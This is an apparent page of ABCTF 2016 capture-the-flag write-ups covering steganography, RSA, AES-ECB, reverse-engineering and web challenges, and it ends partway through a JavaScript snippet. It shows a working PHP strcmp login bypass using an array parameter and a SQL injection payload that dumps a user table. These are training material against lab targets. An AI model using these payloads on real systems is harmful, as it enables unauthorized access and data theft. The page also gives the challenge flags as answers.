      <span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="n">g</span><span class="p">,</span><span class="n">b</span><span class="p">)</span> <span class="o">=</span> <span class="n">pixels_orig</span><span class="p">[</span><span class="n">j</span><span class="p">,</span><span class="n">i</span><span class="p">]</span>
      <span class="n">s</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">r</span><span class="o">&amp;</span><span class="mi">1</span><span class="p">))</span>

<span class="k">print</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</pre></table></code></div></div><p>output</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>000000000100010100110010101011011101010100100100100000100000000100111001101010000000001101
</pre></table></code></div></div><p>File was named <code class="language-plaintext highlighter-rouge">baconian.bmp</code> so we suspect a bacon cipher, and indeed when we decode we get the flag</p><h2> Flag</h2><code> unsolved </code><hr><h1 id="virtual-box-4"> Virtual Box 4 <a href="/CTF-writeups-public/writeups/ABCTF-2016/16-virtual-series-60-virtual-box-4.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> <br /> What’s this?</p><p><strong>Solution</strong> <br /> There was a file named <code class="language-plaintext highlighter-rouge">whats this</code> in recycle bin, restored it, found it originated from location <code class="language-plaintext highlighter-rouge">C:\Program Files\Outlook Express\ABCTF{Y0U_F0UND_ME}</code></p><h2> Flag</h2><code> ABCTF{Y0U_F0UND_ME} </code><hr><h1 id="moonwalk"> Moonwalk <a href="/CTF-writeups-public/writeups/ABCTF-2016/17-forensics-60-moonwalk.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> <br /> There is something a little off about <a href="writeupfiles/PurpleThing.png">this</a> picture. If you could help us we could give you some points! Just find us a flag!</p><p><img src="writeupfiles/PurpleThing.png" alt="" /></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>There was more data appended to the end of the image, we can extract this using <code class="language-plaintext highlighter-rouge">binwalk</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>$ binwalk PurpleThing.png                     [16-07-16 17:56:05]

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 3200 x 2953, 8-bit/color RGBA, non-interlaced
85            0x55            Zlib compressed data, best compression
2757          0xAC5           Zlib compressed data, best compression
765455        0xBAE0F         JPEG image data, JFIF standard 1.01
765485        0xBAE2D         TIFF image data, big-endian, offset of first image directory: 8
1809691       0x1B9D1B        StuffIt Deluxe Segment (data): f
</pre></table></code></div></div><p>we extract the jpeg image</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ binwalk --dd=jpeg PurpleThing.png
</pre></table></code></div></div><p><img src="writeupfiles/BAE0F.jpg" alt="" /></p><h2> Flag</h2><code> ABCTF{PNG_S0_C00l} </code><hr><h1 id="slime-season"> Slime Season <a href="/CTF-writeups-public/writeups/ABCTF-2016/18-programming-60-slime-season.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I only pay in coins because I’m hipster, but I forgot to bring my nickels today! But I really want to buy this elite gaming computer. What’s the smallest amount of coins you need to make $1,827.43 using quarters, dimes, and pennies.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>this is the change making problem, we can solve it with a dynamic programming approach</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">_get_change_making_matrix</span><span class="p">(</span><span class="n">set_of_coins</span><span class="p">,</span> <span class="n">r</span><span class="p">):</span>
     <span class="n">m</span> <span class="o">=</span> <span class="p">[[</span><span class="mi">0</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">r</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)]</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">set_of_coins</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)]</span>
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">r</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
         <span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span>
     <span class="k">return</span> <span class="n">m</span>

<span class="k">def</span> <span class="nf">change_making</span><span class="p">(</span><span class="n">coins</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>

     <span class="n">m</span> <span class="o">=</span> <span class="nf">_get_change_making_matrix</span><span class="p">(</span><span class="n">coins</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>

     <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">coins</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
         <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
             <span class="c1"># Just use the coin coins[c - 1].
</span>             <span class="k">if</span> <span class="n">coins</span><span class="p">[</span><span class="n">c</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">r</span><span class="p">:</span>
                 <span class="n">m</span><span class="p">[</span><span class="n">c</span><span class="p">][</span><span class="n">r</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
             <span class="k">elif</span> <span class="n">coins</span><span class="p">[</span><span class="n">c</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">r</span><span class="p">:</span>
                 <span class="n">m</span><span class="p">[</span><span class="n">c</span><span class="p">][</span><span class="n">r</span><span class="p">]</span> <span class="o">=</span> <span class="n">m</span><span class="p">[</span><span class="n">c</span> <span class="o">-</span> <span class="mi">1</span><span class="p">][</span><span class="n">r</span><span class="p">]</span>
             <span class="k">else</span><span class="p">:</span>
                 <span class="n">m</span><span class="p">[</span><span class="n">c</span><span class="p">][</span><span class="n">r</span><span class="p">]</span> <span class="o">=</span> <span class="nf">min</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="n">c</span> <span class="o">-</span> <span class="mi">1</span><span class="p">][</span><span class="n">r</span><span class="p">],</span> <span class="mi">1</span> <span class="o">+</span> <span class="n">m</span><span class="p">[</span><span class="n">c</span><span class="p">][</span><span class="n">r</span> <span class="o">-</span> <span class="n">coins</span><span class="p">[</span><span class="n">c</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]])</span>
     <span class="k">return</span> <span class="n">m</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

<span class="k">print</span> <span class="nf">change_making</span><span class="p">((</span><span class="mi">1</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">25</span><span class="p">),</span><span class="mi">182743</span><span class="p">)</span>
</pre></table></code></div></div><p>output:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>7315
</pre></table></code></div></div><h2> Flag</h2><code> unsolved </code><hr><h1 id="old-rsa"> Old RSA <a href="/CTF-writeups-public/writeups/ABCTF-2016/19-cryptography-70-old-rsa.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I’m sure you can retrieve the flag from this file.</p><p>file:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>I recovered an RSA encrypted message from the 1980's. can you decrypt it?

c = 29846947519214575162497413725060412546119233216851184246267357770082463030225
n = 70736025239265239976315088690174594021646654881626421461009089480870633400973
e = 3
</pre></table></code></div></div><p><em>Hint: Some good math skills may help.</em></p><p><strong>Solution</strong> Followed a <a href="https://github.com/shiltemann/CTF-writeups-public/blob/master/Hackvent_2015/writeup.md">previous</a> descrpition of how to solve this type of problem.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>N=70736025239265239976315088690174594021646654881626421461009089480870633400973
C=29846947519214575162497413725060412546119233216851184246267357770082463030225
e=3
</pre></table></code></div></div><p><a href="http://factordb.com/index.php?query=70736025239265239976315088690174594021646654881626421461009089480870633400973">factordb.com</a> tells us the p’s and q’s.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>p=238324208831434331628131715304428889871
q=296805874594538235115008173244022912163
</pre></table></code></div></div><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
<span class="kn">import</span> <span class="n">gmpy2</span>

<span class="k">def</span> <span class="nf">int2Text</span><span class="p">(</span><span class="n">number</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
    <span class="n">text</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">chr</span><span class="p">((</span><span class="n">number</span> <span class="o">&gt;&gt;</span> <span class="n">j</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">reversed</span><span class="p">(</span><span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">size</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">8</span><span class="p">))])</span>
    <span class="k">return</span> <span class="n">text</span><span class="p">.</span><span class="nf">lstrip</span><span class="p">(</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)</span>

<span class="n">N</span> <span class="o">=</span> <span class="mi">70736025239265239976315088690174594021646654881626421461009089480870633400973</span>
<span class="n">C</span> <span class="o">=</span> <span class="mi">29846947519214575162497413725060412546119233216851184246267357770082463030225</span>
<span class="n">p</span> <span class="o">=</span> <span class="il">238324208831434331628131715304428889871L</span>
<span class="n">q</span> <span class="o">=</span> <span class="il">296805874594538235115008173244022912163L</span>
<span class="n">r</span><span class="o">=</span><span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<span class="n">e</span> <span class="o">=</span> <span class="il">3L</span>
<span class="n">d</span> <span class="o">=</span> <span class="nf">long</span><span class="p">(</span><span class="n">gmpy2</span><span class="p">.</span><span class="nf">divm</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">r</span><span class="p">))</span>

<span class="n">rsa</span> <span class="o">=</span> <span class="n">RSA</span><span class="p">.</span><span class="nf">construct</span><span class="p">((</span><span class="n">N</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">p</span><span class="p">,</span><span class="n">q</span><span class="p">))</span>
<span class="n">pt</span> <span class="o">=</span> <span class="n">rsa</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="n">C</span><span class="p">)</span>

<span class="k">print</span> <span class="n">pt</span>  <span class="c1"># returns 6872557977505747778161182217242712228364873860070580111494526546045
</span><span class="k">print</span> <span class="nf">int2Text</span><span class="p">(</span><span class="n">pt</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span> <span class="c1">#returns ABCTF{th1s_was_h4rd_in_1980}
</span></pre></table></code></div></div><h2> Flag</h2><code> ABCTF{th1s_was_h4rd_in_1980} </code><hr><h1 id="l33t-h4xx0r"> L33t H4xx0r <a href="/CTF-writeups-public/writeups/ABCTF-2016/20-web-exploitation-70-l33t-h4xx0r.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>If you could bypass the login you could get the flag. <a href="http://yrmyzscnvh.abctf.xyz/web6/">Link</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We get to a webpage with a password field and the message <code class="language-plaintext highlighter-rouge">Seems like your not a haxxor</code>. We are also given the source:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
    <span class="nv">$FLAGWEB6</span> <span class="o">=</span> <span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"flag.txt"</span><span class="p">));</span>
    <span class="nv">$PASSWORD</span> <span class="o">=</span>  <span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"flag.txt"</span><span class="p">));</span> <span class="c1">//haha</span>

    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])){</span>

    <span class="k">if</span><span class="p">(</span><span class="nb">strcmp</span><span class="p">(</span><span class="nv">$PASSWORD</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
            <span class="nv">$success</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span><span class="p">{</span>
            <span class="nv">$success</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$success</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>we see that they use the <code class="language-plaintext highlighter-rouge">strcmp</code> function to check the password. We can bypass this by supplying an array named password, instead of a variable, which will always return 0 in the strcmp function.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://yrmyzscnvh.abctf.xyz/web6/?password[]=bla
</pre></table></code></div></div><h2> Flag</h2><code> abctf{always_know_whats_going_on} </code><hr><h1 id="virtual-box-5"> Virtual Box 5 <a href="/CTF-writeups-public/writeups/ABCTF-2016/21-virtual-series-75-virtual-box-5.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> <br /> I accidentaly closed out this odd message I found. Can you get it back?</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="virtual-box-6"> Virtual Box 6 <a href="/CTF-writeups-public/writeups/ABCTF-2016/22-virtual-series-75-virtual-box-6.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> <br /> I really love this pattern, can I set it as my wallpaper? <a href="http://i.imgur.com/L7M8N4Y.png">Here</a> it is.</p><p><strong>Solution</strong> <br /> We look at the different files used to set patterns on your desktop, and in one names <code class="language-plaintext highlighter-rouge">hounds tooth</code> we find the flag.</p><p>It was also among the recent files in paint.</p><p><img src="writeupfiles/pattern.png" alt="" /></p><h2> Flag</h2><code> ABCTF{I_L0VE_PATTERNS} </code><hr><h1 id="aes-mess"> AES Mess <a href="/CTF-writeups-public/writeups/ABCTF-2016/23-cryptography-75-aes-mess.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We encrypted a flag with AES-ECB encryption using a secret key, and got the hash:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>e220eb994c8fc16388dbd60a969d4953f042fc0bce25dbef573cf522636a1ba3fafa1a7c21ff824a5824c5dc4a376e75
</pre></table></code></div></div><p>However, we lost our plaintext flag and also lost our key and we can’t seem to decrypt the hash back :(. Luckily we encrypted a bunch of other flags with the same key. Can you recover the lost flag using <a href="writeupfiles/aesmess.txt">this</a>?</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>AES in ECB mode has the unfortunate characteristic that identical plaintext, when encrypted with the same key always outputs the same ciphertext, since we are given a bunch of encryptions of different plaintext using the same key, we can use this to find our decryption.</p><p>Each of the blocks in our given plaintext appears exactly in one of the other encryption, so we can reconstruct the plaintext</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>e220eb994c8fc16388dbd60a969d4953f042fc0bce25dbef573cf522636a1ba3fafa1a7c21ff824a5824c5dc4a376e75

block1: e220eb994c8fc16388dbd60a969d4953
block2: f042fc0bce25dbef573cf522636a1ba3
block3: fafa1a7c21ff824a5824c5dc4a376e75


abctf{looks_like_gospel_feebly}:
e220eb994c8fc16388dbd60a969d4953 &lt;-- // abctf{looks_like
6d896bd7d6da9c4ce3eac5e4832c2f64     //_gospel_feebly}

abctf{verism_evg_you_can_break_ajugas}:
528c30c67c57968fa131684d07c1fa9c     // abctf{verism_evg
f042fc0bce25dbef573cf522636a1ba3 &lt;-- // _you_can_break_a
c0bd6ceeec8e817f1be7b09a9a8b0fb8     // jugas}

abctf{amidin_ogees}:
5f0ec66748ad4e9c512616572dd9197b     // abctf{amidin_oge
fafa1a7c21ff824a5824c5dc4a376e75 &lt;-- // es}
</pre></table></code></div></div><p>so now we just put the three plaintext blocks together to obtain the key:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>block1: e220eb994c8fc16388dbd60a969d4953   -   abctf{looks_like
block2: f042fc0bce25dbef573cf522636a1ba3   -   _you_can_break_a
block3: fafa1a7c21ff824a5824c5dc4a376e75   -   es}
</pre></table></code></div></div><h2> Flag</h2><code> abctf{looks_like_you_can_break_aes} </code><hr><h1 id="passwordpdf"> PasswordPDF <a href="/CTF-writeups-public/writeups/ABCTF-2016/24-forensics-80-passwordpdf.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> <br /> Oh no. We locked <a href="writeupfiles/mypassword.pdf">this PDF</a> and forgot the password. Can you help us?</p><p><em>Is there anyway to guess the password?</em></p><p><strong>Solution</strong></p><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>flag
</pre></table></code></div></div><h2> Flag</h2><code> unsolved </code><hr><h1 id="get-em-all"> Get ‘Em all <a href="/CTF-writeups-public/writeups/ABCTF-2016/25-web-exploitation-80-get-em-all.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> I think one of the users data fields holds a flag. If only you could find the username. Link</p><p><strong>Solution</strong> SQL injection challenge, we enter the following in the input field:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>' or 'x'='x
</pre></table></code></div></div><p>and get the following output, which includes the flag</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>Name: Luke
Data: I made this problem.
Name: Alec
Data: Steam boys.
Name: Jalen
Data: Pump that iron fool.
Name: Eric
Data: I make cars.
Name: Sam
Data: Thinks he knows SQL.
Name: fl4g__giv3r
Data: ABCTF{th4t_is_why_you_n33d_to_sanitiz3_inputs}
Name: snoutpop
Data: jowls
Name: Chunbucket
Data: @datboiiii
</pre></table></code></div></div><h2> Flag</h2><code> ABCTF{th4t_is_why_you_n33d_to_sanitiz3_inputs} </code><hr><h1 id="js-pls"> JS Pls <a href="/CTF-writeups-public/writeups/ABCTF-2016/26-reverse-engineering-80-js-pls.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> Can you figure out the flag from <a href="writeupfiles/jspls.js">this</a>? Have fun ;)</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>eval(new Buffer('cHJvY2Vzcy5z [..snip..] pdCgpO30pOwo=','base64').toString());
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We base64 decode and find <a href="writeupfiles/jspls2.js">obfuscated javascript</a></p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="nx">process</span><span class="p">.</span><span class="nx">stdin</span><span class="p">.</span><span class="nf">resume</span><span class="p">();</span>
<span class="nx">process</span><span class="p">.</span><span class="nx">stdin</span><span class="p">.</span><span class="nf">setEncoding</span><span class="p">(</span><span class="dl">'</span><span class="s1">utf8</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Give me a flag</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">process</span><span class="p">.</span><span class="nx">stdin</span><span class="p">.</span><span class="nf">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">data</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="o">=</span> <span class="o">&gt;</span> <span class="p">{</span>
  <span class="nx">t</span> <span class="o">=</span> <span class="nx">t</span><span class="p">.</span><span class="nf">trim</span><span class="p">();</span>
  <span class="k">if </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">length</span> <span class="o">===</span> <span class="o">+</span> <span class="p">[[</span> <span class="o">+</span> <span class="o">!</span> <span class="o">+</span> <span class="p">[]]</span> <span class="o">+</span> <span class="p">[</span><span class="o">!</span> <span class="o">+</span> <span class="p">[]</span> <span class="o">+</span> <span class="o">!</span> <span class="o">+</span> <span class="p">[]</span> <span class="o">+</span> <span class="o">!</span> <span class="o">+</span> <span class="p">[]</span> <span class="o">+</span> <span class="o">!</span> <span class="o">+</span> <span class="p">[]</span> <span class="o">+</span> <span class="o">!</span> <span class="o">+</span> <span class="p">[]</span> <span class="o">+</span> <span class="o">!</span> <span class="o">+</span> <span class="p">[]</span> <span class="o">+</span> <span class="o">!</span> <span class="o">+</span> <span class="p">[]</span> <span class="o">+</span> <span class="o">!</span> <span class="o">+</span> <span class="p">[]</span> <span class="o">+</span> <span class="o">!</span> <span class="o">+</span> <span class="p">[]]])</span> <span class="p">{</span>

<span class="p">[..</span><span class="nx">snip</span><span class="p">..]</span>

     <span class="o">!</span> <span class="o">+</span> <span class="p">[]]</span> <span class="o">+</span> <span class="p">(</span><span class="o">!!</span><span class="p">[]</span> <span class="o">+</span> <span class="p">[])</span> <span class="p">[</span> <span class="o">+</span> <span class="o">!</span> <span class="o">+</span> <span class="p">[]]])</span> <span class="p">[</span> <span class="o">+</span> <span class="o">!</span> <span class="o">+</span> <span class="p">[]</span> <span class="o">+</span> <span class="p">[</span> <span class="o">+</span> <span class="p">[]]]</span> <span class="o">+</span> <span class="p">(</span><span class="o">!!</span><span class="p">[]</span> <span class="o">+</span> <span class="p">[])</span> <span class="p">[</span> <span class="o">+</span> <span class="o">!</span> <span class="o">+</span> <span class="p">[]]])</span> <span class="p">[</span><span class="o">!</span> <span class="o">+</span> <span class="p">[]</span> <span class="o">+</span> <span class="o">!</span> <span class="o">+</span> <span class="p">[]</span> <span class="o">+</span> <span class="p">[</span> <span class="o">+</span> <span class="p">[]]]](</span><span class="o">!</span> <span class="o">+</span> <span class="p">[]</span> <span class="o">+</span> <span class="o">!</span> <span class="o">+</span> <span class="p">[]</span> <span class="o">+</span> <span class="p">[</span> <span class="o">+</span> <span class="o">!</span> <span class="o">+</span> <span class="p">[]]))</span> 